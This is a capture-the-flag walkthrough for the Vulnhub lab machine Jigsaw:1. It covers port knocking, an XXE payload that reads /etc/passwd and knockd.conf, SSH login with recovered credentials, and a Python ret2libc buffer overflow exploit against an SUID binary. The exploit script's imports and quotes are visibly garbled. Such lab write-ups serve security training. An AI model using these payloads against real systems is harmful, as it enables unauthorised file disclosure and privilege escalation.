<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
            <h1 class="post-title entry-title">Jigsaw:1 Vulnhub Walkthrough</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/jigsaw1-vulnhub-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2019-11-25T07:22:53+00:00">November 25, 2019</time><time class="updated" datetime="2025-06-10T20:10:55+00:00">June 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">Hello guys, today we will face a slightly more complex challenge. Introducing the Jigsaw: 1 virtual machine, the first of the “Jigsaw” series created by “<strong><a style="color: #000000;" href="https://twitter.com/zayotic">Zayotic</a></strong>” and available on <a style="color: #000000;" href="https://www.vulnhub.com/"><strong>Vulnhub</strong></a>. This is another boot2root-style challenge where we have to escalate privileges to the “root user” and capture a flag to complete the challenge.</span></p>
<p><span style="color: #000000;"><strong>Level</strong>: Hard to Insane</span></p>
<p><span style="color: #000000;">Since these labs are available on the Vulnhub Website. We will be downloading the lab file from this <a style="color: #000000;" href="https://www.vulnhub.com/entry/jigsaw-1,310/"><strong>link</strong></a>.</span></p>
<h3><span style="color: #800000;"><strong>Penetration Methodologies:</strong></span></h3>
<ul>
<li><span style="color: #000000;"><strong>Network Scanning (Part 1)</strong></span>
<ul>
<li><span style="color: #000000;">ARP Scan</span></li>
<li><span style="color: #000000;">TCPDump</span></li>
</ul>
</li>
<li><span style="color: #000000;"><strong>Enumeration (Part 1)</strong></span>
<ul>
<li><span style="color: #000000;">Netcat</span></li>
<li><span style="color: #000000;">Reading the Flag1</span></li>
</ul>
</li>
<li><span style="color: #000000;"><strong>Network Scanning (Part 1)</strong></span>
<ul>
<li><span style="color: #000000;">Port Knocking</span></li>
<li><span style="color: #000000;">Nmap Scan</span></li>
</ul>
</li>
<li><span style="color: #000000;"><strong>Enumeration (Part 2)</strong></span>
<ul>
<li><span style="color: #000000;">Browsing HTTP Service</span></li>
<li><span style="color: #000000;">Hidden Information in GIF image</span></li>
</ul>
</li>
<li><span style="color: #000000;"><strong>Exploitation</strong></span>
<ul>
<li><span style="color: #000000;">XXE Attack in Form Login</span></li>
<li><span style="color: #000000;">Port Knocking</span></li>
<li><span style="color: #000000;">Getting a SSH Connection</span></li>
<li><span style="color: #000000;">Enumeration Files and Directories</span></li>
<li><span style="color: #000000;">Reading the Flag2</span></li>
</ul>
</li>
<li><span style="color: #000000;"><strong>Post Exploitation</strong></span>
<ul>
<li><span style="color: #000000;">Getting Login Credentials</span></li>
<li><span style="color: #000000;">Enumeration for SUID binaries</span></li>
</ul>
</li>
<li><span style="color: #000000;"><strong>Creating Exploit</strong></span>
<ul>
<li><span style="color: #000000;">Overview Buffer Overflow Return-to-Libc</span></li>
<li><span style="color: #000000;">Check Buffer length</span></li>
<li><span style="color: #000000;">First Payload Script</span></li>
<li><span style="color: #000000;">Get System, exit and /bin/sh addresses</span></li>
</ul>
</li>
<li><span style="color: #000000;"><strong>Privilege Escalation</strong></span>
<ul>
<li><span style="color: #000000;">Execute Exploit Created</span></li>
<li><span style="color: #000000;">Confirm Root Access</span></li>
<li><span style="color: #000000;">Reading the Final Flag (Flag3) in /root/gameover.txt</span></li>
</ul>
</li>
</ul>
<h3><span style="color: #000000;"><strong>Walkthrough</strong></span></h3>
<h3><span style="color: #800000;"><strong>Network Scanning (Part 1)</strong></span></h3>
<p><span style="color: #000000;">First, we will find the IP address of our target machine and for that please use the following command as it helps to see all the IP’s in an internal network through of a specific network interface:</span></p>
<pre class="lang:default decode:true ">arp-scan --localnet --ignoredups</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-91EvTO1YcOc/XdtnapQm7VI/AAAAAAAAhbI/vSP3ojnCQ1UfIU_2NG5aqkG95jkLlvTGgCLcBGAsYHQ/s1600/01.png"/></span></p>
<p><span style="color: #000000;">We found the target IP Address 192.168.138.100.</span></p>
<p><span style="color: #000000;">Normally, we would start a basic port scan (using nmap or another tool) for services or some vulnerability. However, the author of this box leaves a subtle tip stating to pay more attention to ARP packages. We can read this hint in the box description before downloading it:</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Lk7oWMMs3n8/Xdtnal3kqNI/AAAAAAAAhbM/Mb63D_JjnQwkd2jAvlnUt_Rf-DPx021qgCLcBGAsYHQ/s1600/02.png"/></span></p>
<p><span style="color: #000000;">So, we can listen to network traffic through tools such as <strong>Wireshark</strong> or <strong>TCPDump</strong>. For example, using the following command we can listen to traffic through the terminal, filtering for ARP packets:</span></p>
<pre class="lang:default decode:true">tcpdump -A -n host 192.168.138.100 and arp</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-6YFVckQZ9Gs/Xdtna_Lrz8I/AAAAAAAAhbQ/jiX6OjN0Jv0g670WJh8JwmWhT8zYLeTawCLcBGAsYHQ/s1600/03.png"/></span></p>
<p><span style="color: #000000;">We may notice that after a while we did not receive much useful information. We can then deduce that it could be a fake tip or at least a trick question. With this understanding, we can try to “exclude all ARP traffic from this capture” using the following command:</span></p>
<pre class="lang:default decode:true">tcpdump -A -n host 192.168.138.100 and not arp</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-29O1XhyMVak/Xdtnb6sUFnI/AAAAAAAAhbU/SMP6jxfNmKIBaIcbVnxdHMJZwJElDYRLACLcBGAsYHQ/s1600/04.png"/></span></p>
<p><span style="color: #000000;">A few seconds after the previous command has been executed, we may see a different message coming out of <strong>UDP port 666</strong> in this box.</span></p>
<h3><span style="color: #800000;"><strong>Enumeration (Part 1)</strong></span></h3>
<p><span style="color: #000000;">Apparently we may have some password in leet mode or something expected with this feature. That way, we can perform a basic test on UDP port 666 <strong>using Netcat to identify some useful information</strong> with the following command:</span></p>
<pre class="lang:default decode:true ">nc -u 192.168.138.100 666</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-IviX_-8UXRE/XdtncFxjwoI/AAAAAAAAhbY/w-1Jxeg0FxgKoziGL9AsQb9etTi5FZAwwCLcBGAsYHQ/s1600/05.png"/></span></p>
<p><span style="color: #000000;">We can see that after testing a few words, we get ciphertext when we send “<strong>j19s4w</strong>” (leet mode). The message appears to be <strong>base64 encoded</strong>. Using the following command, we can send the right word and try to decipher the content of the received message:</span></p>
<pre class="lang:default decode:true">python -c "print 'j19s4w'" | nc -u 192.168.138.100 666 -q1 | base64 -d</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-38DNmum-dU4/XdtncKoyhII/AAAAAAAAhbc/tqxRi-xEMvcJ5MBpHqxBYdI_2VvXJHkMgCLcBGAsYHQ/s1600/06.png"/></span></p>
<pre class="lang:default decode:true">flag1{3034cc2927b59e0b20696241f14d573e}</pre>
<p><span style="color: #000000;">We managed to capture the first flag and at the same time a tip to continue the exploration.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-cY1-23Bw1E4/XdtncqEM_2I/AAAAAAAAhbg/xKq9u9jok8M3rohSnENsdv84RpHQIcHaQCLcBGAsYHQ/s1600/07.png"/></span></p>
<p><span style="color: #000000;">Moving on to the next tip, you will need to perform a procedure known as “Port Knocking”.</span></p>
<h3><span style="color: #800000;"><strong>Network Scanning (Part 2)</strong></span></h3>
<p><span style="color: #000000;">Using the script below, we hit the indicated ports in the correct sequence using Nmap:</span></p>
<pre class="lang:default decode:true">for knock in 5500 6600 7700; do nmap -Pn --host-timeout 201 --max-retries 0 -p $knock 192.168.138.100; done</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-CaOkji78zBs/XdtndDbPgxI/AAAAAAAAhbk/olri5nFwdOEMcknG8Hcc-OWo96MxS1MVgCLcBGAsYHQ/s1600/08.png"/></span></p>
<p><span style="color: #000000;">Alternatively, you can also perform the “Port Knocking” process with the “Knock” command, according to the following syntax:</span></p>
<pre class="lang:default decode:true">knock 192.168.138.100 5500 6600 7700</pre>
<p><span style="color: #000000;">Now, that we have knocked on the correct ports and sequence, generally the protection system frees access to other server ports. In order to guarantee and test, we can perform a basic port scan using Nmap with the following command:</span></p>
<pre class="lang:default decode:true">nmap -A -T4 -p- 192.168.138.100</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-t4kOJjmdwXg/XdtndGfd2eI/AAAAAAAAhbo/LttBINqWcKUmANYXXwJrl9GVIg2wA0cTQCLcBGAsYHQ/s1600/09.png"/></span></p>
<p><span style="color: #000000;">Thus, we can see that after “Port Knocking”, the system opened access to TCP port 80.</span></p>
<h3><span style="color: #800000;"><strong>Enumeration (Part 2)</strong></span></h3>
<p><span style="color: #000000;">As port 80 is open, let us try and open the IP in the browser as shown in the image below:</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-hGEcMf0hHow/Xdtnd3iazZI/AAAAAAAAhbs/ZDwyOS6OTMYBAmj_tdPwLcrFoFFEekQoQCLcBGAsYHQ/s1600/10.png"/></span></p>
<p><span style="color: #000000;">While there appears to be nothing on this page, we can proceed to parse the source code for useful information.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-KD9rQEWH9iI/XdtnefH6_qI/AAAAAAAAhbw/wPsQ5hg35EUf5GKDfeOALcTyTwcgo33lwCLcBGAsYHQ/s1600/11.png"/></span></p>
<p><span style="color: #000000;">We can also search for files and directories in the “/robots.txt” file:</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-C09dDuxBeIM/XdtpSKukDAI/AAAAAAAAhfQ/YwhkwSKFAJo9EppYz3sJZ4qw53gIZuYxQCEwYBhgL/s1600/12.png"/></span></p>
<p><span style="color: #000000;">So far, none of the visible information we have found has taken us anywhere. We can also try to search directories and files through web crawlers like Dirsearch, Gobuster, Dirb, et.al., unfortunately, this procedure in this box will not return any known directories through common dictionaries.</span></p>
<p><span style="color: #000000;">If we take into account the “<strong>thinking outside the box</strong>” common in CTF challenges, when faced with images and data files, the idea of “<strong>steganography</strong>”, data hidden in other files, comes up. Finally, we can also <strong>try to analyze the GIF image</strong> used as the background of this page.</span></p>
<p><span style="color: #000000;">With the following command, we can download this image to our attacking machine:</span></p>
<pre class="lang:default decode:true">wget -c http://192.168.138.100/jigsaw.gif</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-1TpEtKHa_vo/XdtpS2ZR87I/AAAAAAAAhdE/FMigZBC0oFEsd7booJ1QGQWIAJWaimq_wCEwYBhgL/s1600/13.png"/></span></p>
<p><span style="color: #000000;">We can use the “file” command to verify that the file type is different than expected.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-0Tv1b6rF6TE/XdtrBkrFqUI/AAAAAAAAhgc/qjki8SpA35UhXxWTMm-SCOSP2LDRN6TGgCLcBGAsYHQ/s1600/14.png"/></span></p>
<p><span style="color: #000000;">In addition, it is also indicated to look for apparent “strings” in the file structure using the following command:</span></p>
<pre class="lang:default decode:true">file jigsaw.gif 
strings jigsaw.gif</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-fTCnKttLTaM/XdtrCMj8IhI/AAAAAAAAhgg/BnIvs7uBNsEw2JvJ-9ffHpyEfQ9cthx9gCLcBGAsYHQ/s320/15.png"/></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-yf25CPkeArs/XdtrCfQtJNI/AAAAAAAAhgk/sv2jlCCVi_UBdwwDT1-qlnYkEWF6dJFtwCLcBGAsYHQ/s320/16.png"/></span></p>
<p><span style="color: #000000;">After analyzing the various exposed “strings” of this file, we reach the last line. This line, quite different from the previous ones, besides being larger, has a structure similar to the division of directories in <strong>common URL format</strong>.</span></p>
<p><span style="color: #000000;">It seems that this is a new way and so we can test right in the browser.</span></p>
<pre class="lang:default decode:true">http://192.168.138.100/w4n770p14y494m3/</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-CqnKoL6ISHQ/XdtrDONixuI/AAAAAAAAhgo/-SknOsSlw-A_3xGZxDdh0zxc7p3TpgIgwCLcBGAsYHQ/s1600/17.png"/></span></p>
<p><span style="color: #000000;">Now that we have discovered a new environment, we have access to a login form. After some testing, whenever we enter an incorrect user, the form displays an error message, as shown below.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-0Y3wzUhP3_8/XdtrDMIxtbI/AAAAAAAAhgs/Ed7Sl2u-XS4RQLW3AkuOaH2d3lbYIEvGACLcBGAsYHQ/s1600/18.png"/></span></p>
<p><span style="color: #000000;">As usual, we can evaluate the source code for any information that may be any hint or developmental flaw, such as a comment, link, path, etc.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-DBuezyHgZWo/XdtrDUMNyKI/AAAAAAAAhgw/Xz15ScixB0gkOeziuLL03Ag8Zrd8hcCIACLcBGAsYHQ/s1600/19.png"/></span></p>
<p><span style="color: #000000;">Here we have an <strong>XML function</strong> that handles this login form. And if you are already an experienced CTF challenge practitioner or keep up to date on new attacks, you may have realized that we will probably be able to exploit this environment using some “<strong>XML External Entity Attack</strong> or <strong>XXE Attack</strong>”.</span></p>
<h3><span style="color: #800000;"><strong>Exploitation</strong></span></h3>
<p><span style="color: #000000;">Apparently, this environment “may” be vulnerable to attacks of the XXE type. This way we can try to alter the original request and manipulate this data in order to get sensitive information from inside the server.</span></p>
<p><span style="color: #000000;">To test the environment, we can intercept the original request (with a proxy like Burpsuite) and change this data by inserting a payload. To assist in this step, we can use some payload available on “<strong><a style="color: #000000;" href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection">PayloadsAllTheThings</a></strong>” through Github.</span></p>
<p><span style="color: #000000;">Below is an example of a common request whenever we try to log in by default through the browser. For example, by entering the following email “<strong>admin@jigsaw.local</strong>” with the password “<strong>admin</strong>“:</span></p>
<pre class="lang:default decode:true">&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;root&gt;&lt;email&gt;admin@jigsaw.local&lt;/email&gt;&lt;password&gt;admin&lt;/password&gt;&lt;/root&gt;</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-lm_46Jm7Nd8/XdtrD5f-b_I/AAAAAAAAhg0/Ik-kHfnt7WkndXh7mPqPQKbxE-t2vT9ZACLcBGAsYHQ/s1600/20.png"/></span></p>
<p><span style="color: #000000;">Understanding this request and response process, we can manipulate data sent via the HTTP POST method and submit our payload. The payload below was built for this tutorial example. Basically, if the application is vulnerable it will return the contents of the file “<strong>/etc/passwd</strong>“.</span></p>
<pre class="lang:default decode:true">&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;!DOCTYPE test [ &lt;!ELEMENT test ANY &gt; &lt;!ENTITY my_email SYSTEM "file:///etc/passwd" &gt;]&gt;&lt;root&gt;&lt;email&gt;&amp;my_email;&lt;/email&gt;&lt;password&gt;&lt;/password&gt;&lt;/root&gt;</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-5d96bz_nqTU/XdtrEG4n3cI/AAAAAAAAhg4/BWK3sv_LLkQSRsSiAJBnv0sRfdGjurEgwCLcBGAsYHQ/s1600/21.png"/></span></p>
<p><span style="color: #000000;">Now that we have Proof of Concept (PoC), we can then continue exploring. Also, we already know that there is a <strong>user named “jigsaw”</strong> with login permission for this machine.</span></p>
<p><span style="color: #000000;">As this is access made through the “Port Knocking” protection feature, it is ideal to read the information of the configuration file of this service located at “<strong>/etc/knockd.conf</strong>“.</span></p>
<p><span style="color: #000000;">For this, we can only change the file to be read, informing in the payload, the desired configuration file:</span></p>
<pre class="lang:default decode:true">&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;!DOCTYPE test [ &lt;!ELEMENT test ANY &gt; &lt;!ENTITY my_email SYSTEM "file:///etc/knockd.conf" &gt;]&gt;&lt;root&gt;&lt;email&gt;&amp;my_email;&lt;/email&gt;&lt;password&gt;&lt;/password&gt;&lt;/root&gt;</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-4DVB37qMuhc/XdtrEdEhz5I/AAAAAAAAhg8/s7zwQ3FJlmEis7-bfH-QYBPqau0Sz3JhgCLcBGAsYHQ/s1600/22.png"/></span></p>
<p><span style="color: #000000;">The file returned some settings for opening and closing specific ports using Port Knocking. In addition, we also have the <strong>sequence to also allow access to port 22 for SSH</strong>.</span></p>
<p><span style="color: #000000;">Now that we know how to release SSH, let’s test and explore this service. We have done this before using a basic script to “knock” in sequence and correct ports. However, alternatively we can execute the “knock” command to perform this procedure as shown below:</span></p>
<pre class="lang:default decode:true">knock 192.168.138.100 7011 8011 9011 
nmap -A -T5 -p22 192.168.138.100</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-ZmhHRLkdO1Q/XdtrFf8HBLI/AAAAAAAAhhA/wdxjoFohuqkS0CbOc9N0DYW6hbb2gJmsgCLcBGAsYHQ/s1600/23.png"/></span></p>
<p><span style="color: #000000;">Now we can try to access this service. We have at hand the user “jigsaw” but not much information about the likely password. However, if you come back a little earlier, during the Network Sniffing procedure, we capture a message via the UDP protocol.</span></p>
<p><span style="color: #000000;">Username: <strong>jigsaw<br/>
</strong>Password: <strong>j19s4w</strong></span></p>
<p><span style="color: #000000;">So, with the credentials in hand, just test and validate access.</span></p>
<pre class="lang:default decode:true">ssh jigsaw@192.168.138.100 -p22
password: j19s4w</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-ABxUZwp9btI/XdtrFr1fJqI/AAAAAAAAhhE/dCv-VdTiphsSOuIVWG7Z72b8O3kOFuu3ACLcBGAsYHQ/s1600/24.png"/></span></p>
<h3><span style="color: #800000;"><strong>Post Exploitation</strong></span></h3>
<p><span style="color: #000000;">Once we access the machine, we can list the contents of the current directory, looking for files that can provide more information or tips.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-FsSBt0UxtwY/XdtrF2wHWfI/AAAAAAAAhhI/7h_fwY3rsws6DfzTe76TfdW4hnZluSGgwCLcBGAsYHQ/s1600/25.png"/></span></p>
<p><span style="color: #000000;">Great, we got the second flag of this challenge easy. Besides, we already know that there is still one last challenge.</span></p>
<pre class="lang:default decode:true">flag2{a69ef5c0fa50b933f05a5878a9cbbb54}</pre>
<p><span style="color: #000000;">The current user has no administrative permissions and apparently we will need to go up a privilege level and get access from the “root user”. We can navigate between directories and search for files and folders with write, read and execute permissions, search for SUDO permissions and also for executables with SUID and/or GUID.</span></p>
<p><span style="color: #000000;">Unfortunately, this user is not allowed to execute commands through SUDO permissions.</span></p>
<pre class="lang:default decode:true">sudo -l</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-0vuhMYi0Y8w/XdtrGaYNF4I/AAAAAAAAhhM/s_nPzKPXLVoZjLKj8Wk57Ye0ug6kzx4zQCLcBGAsYHQ/s1600/26.png"/></span></p>
<p><span style="color: #000000;">Another alternative is to look for SUID / GUID executables.</span></p>
<pre class="lang:default decode:true">find / -perm -u=s -type f 2&gt;/dev/null</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/--5r1Mn22t70/XdtrGkRxvmI/AAAAAAAAhhQ/xPoZDAwWAfk9DuyIc2qK9Yf2iuzK0kU0QCLcBGAsYHQ/s1600/27.png"/></span></p>
<p><span style="color: #000000;">The search for SUID executables brought us a very interesting binary: “/bin/game3”.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-GHalcmkUlwM/XdtrHL92ENI/AAAAAAAAhhU/CkwV8lhxC9MXvc9hxsQpxxWob73XeaWMQCLcBGAsYHQ/s1600/28.png"/></span></p>
<p><span style="color: #000000;">This binary gives us an idea that we are on the right track because if you check the paths so far, this will be the 3rd challenge.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-TaxHWiWVHDs/XdtrHWiJFII/AAAAAAAAhhY/ddCwMLN7ANMrX9CAhISxOBVjBDaKVzl7ACLcBGAsYHQ/s1600/29.png"/></span></p>
<p><span style="color: #000000;">It is an <strong>ELF 32bits file</strong>, ie an executable for Linux. We could look for strings, test outputs and other methods: everything is valid. However, advancing the process, after some tests (entering several data as input), we can identify a possible stack overflow, ie, <strong>this binary is probably vulnerable to “Buffer Overflow”.</strong></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-E1B264658r4/XdtrHq0BkwI/AAAAAAAAhhc/5e2wkJxP-PknI-6uEtTm4PZMpEtduG7IgCLcBGAsYHQ/s1600/30.png"/></span></p>
<h3><span style="color: #800000;"><strong>Creating Exploit</strong></span></h3>
<p><span style="color: #000000;">I confess to you that my knowledge of binary exploration and reverse engineering in ELF is quite basic, but I am working to evolve this skill.</span></p>
<p><span style="color: #000000;">Let’s take a moment to analyze the return of the “file” command to better understand each step below.</span></p>
<pre class="lang:default decode:true">/bin/game3 
file /bin/game3</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Ez-tEBKtAwM/XdtrHw8CVYI/AAAAAAAAhhg/hAbKYgVUom8H-zxBhgCrvvT3iUjE0fANwCLcBGAsYHQ/s1600/31.png"/></span></p>
<p><span style="color: #000000;">The result of executing the command shows that we have a 32-bit executable ELF, dynamically linked (linked with libc includes) and not-stripped (meaning it contains all the debugging information).</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-sS3k1YH1gi0/XdtrIU_giwI/AAAAAAAAhhk/aHASgg4i4a4tMbFZJomquNMg3IJ8lyu8QCLcBGAsYHQ/s1600/32.png"/></span></p>
<p><span style="color: #000000;">Since the target machine does not have an internal debugger (like GDB), we can copy the binary to the attacking machine and try to exploit this binary there to create our exploit. This is “<strong><a style="color: #000000;" href="https://en.wikipedia.org/wiki/Return-to-libc_attack">BoF Ret2Libc (Return-to-libc)</a></strong>“.</span></p>
<p><span style="color: #000000;">The command below copies the torque from the target machine to the attacking machine:</span></p>
<pre class="lang:default decode:true">scp jigsaw@192.168.138.100:/bin/game3  /destination_path</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-JyOX9CpdV7Q/XdtrIjlwwhI/AAAAAAAAhho/5MyNilYsc5kNHsymGUQuXybJHHbiud8IACLcBGAsYHQ/s1600/33.png"/></span></p>
<h3><span style="color: #800000;"><strong>Check Buffer length</strong></span></h3>
<p><span style="color: #000000;">We know that after entering certain amounts of characters the executable returns “segmentation failure”, an overflow. However, if we test one character at a time until we find the correct amount, we will lose a lot of time.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-GLzeMzLYMyk/XdtrIzaPKiI/AAAAAAAAhhs/pMF4vT6StTUyJk62157x-IDyp1Bg39lbQCLcBGAsYHQ/s1600/34.png"/></span></p>
<p><span style="color: #000000;">Therefore, it is faster to use <a style="color: #000000;" href="https://github.com/longld/peda"><strong>gdb-peda</strong></a> ‘<strong>pattern_create</strong>‘ and ‘<strong>pattern_offset</strong>‘ functions to identify the pattern and how much overflow occurred.</span></p>
<p><span style="color: #000000;">After executing the binary with the pattern created with 200 characters (<strong>pattern_create 200</strong>), an overflow is returned at address: <strong>0x41344141</strong>. We can look at the image below and check the pattern that filled the <strong>EIP</strong>.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-gMc6TRpf2N4/Xdtwpo2a9-I/AAAAAAAAhlc/vmUHnZ8jBK0XfXir-BewtfUMnDUqnfeAACLcBGAsYHQ/s1600/35.png"/></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-KxPoMAxHD4c/XdtwpwxYB6I/AAAAAAAAhlg/kCNcJqpXkxoM56TaZiv0prO_pTgc4_J8QCLcBGAsYHQ/s1600/36.png"/></span></p>
<p><span style="color: #000000;">With the <strong>pattern_offset function</strong> we will identify how much the burst actually occurred. Just tell the function the value (default) that went to the EIP.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-CqpeTfFspUA/XdtwqHKI5RI/AAAAAAAAhlk/Wm8Q3x8bfRI8PCXeQuXSj3VeYtuwroVQgCLcBGAsYHQ/s1600/37.png"/></span></p>
<p><span style="color: #000000;">We now know that the <strong>number of characters to replace and fill the</strong> <strong>EIP is 76</strong>. This is the <strong>size</strong> of our <strong>Buffer</strong>.</span></p>
<p><span style="color: #000000;">Therefore, we will begin our exploration. For this exploit, we will use the python language, as it has execution permission on the target machine. If you want to better understand the payload creation process to exploit the ret2libc attack, you can use the article posted on the <strong>SpZ blog</strong> as a guide.</span></p>
<h3><span style="color: #800000;"><strong>First Payload Script</strong></span></h3>
<p><span style="color: #000000;">In order to test, let’s develop our first payload and test. Below is a basic python payload example:</span></p>
<pre class="lang:default decode:true">import struct 
buf = "A" * 76 
buf += struct.pack("&lt;I", 0xabcdef00) #Exit Addr 
print buf</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-EL094IVO6xA/Xdtwqs6bf_I/AAAAAAAAhlo/jKEQKajFtE4_xqNtmfyDxzEtc9_7vr2iQCLcBGAsYHQ/s1600/38.png"/></span></p>
<p><span style="color: #000000;">Let’s save this payload to some “file.py ” and run it on gdp-peda.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-R2U8QKYk_oQ/Xdtwq4FOHGI/AAAAAAAAhls/ZExdWnX-xTIijXNnORvG21G6gBGjXVchQCLcBGAsYHQ/s1600/39.png"/></span></p>
<p><span style="color: #000000;">We were able to fill in the EIP with the data we sent. So notice that the <strong>Exit Address has been manipulated</strong>.</span></p>
<h3><span style="color: #800000;"><strong>Get System, exit and /bin/sh addresses</strong></span></h3>
<p><span style="color: #000000;">To override the EIP and inject our shell, we still need to get 3 more addresses: <strong>Libc System Address, Libc Exit Address, Libc “/bin/sh” Address</strong>.</span></p>
<p><span style="color: #000000;">So we should go back to the target VM and we will develop the payload within it. It is recommended to access any directory that the current user has write permission to, such as “/tmp”.</span></p>
<p><span style="color: #000000;">At the target VM, we will type the commands below to collect the respective addresses for Libc:</span></p>
<pre class="lang:default decode:true">ldd /bin/game3 | grep libc 
readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system 
readelf -s /lib/i386-linux-gnu/libc.so.6 | grep exit 
strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-ni9nwUXmRgc/XdtwrHynukI/AAAAAAAAhlw/xyT2TISxSw4Wllnz-o3hP3Zex8HJPbFTgCLcBGAsYHQ/s1600/40.png"/></span></p>
<p><span style="color: #000000;">We now have the following addresses:</span></p>
<p><span style="color: #000000;">Libc Base Addr: <strong>0xb7557000</strong></span><br/>
<span style="color: #000000;">Libc System Addr: <strong>0x00040310</strong></span><br/>
<span style="color: #000000;">Libc Exit Addr: <strong>0x00033260</strong></span><br/>
<span style="color: #000000;">Libc /bin/sh Addr: <strong>0x00162d4c</strong></span></p>
<p><span style="color: #000000;">To create our exploit, let’s edit a file.py (same xpl.py, for example) in the directory we chose earlier. Below is a code example for our payload. It’s no use wanting to copy and place the code that probably the addresses will be different in your environment:</span></p>
<pre class="lang:default decode:true">from subprocess 
import call import struct 
base_addr = 0xb7557000 
sys_addr = struct.pack("&lt;I", base_addr+0x00040310) 
exit_addr = struct.pack("&lt;I", base_addr+0x00033260) 
shell_addr = struct.pack("&lt;I", base_addr+0x00162d4c) 
buf = "A"*76 
buf += sys_addr 
buf += exit_addr 
buf += shell_addr 
i = 0 
while(i&lt;512):     
print(“Trying: %s” % (i))     
i += 1     
ret = call(["/bin/game3", buf])</pre>
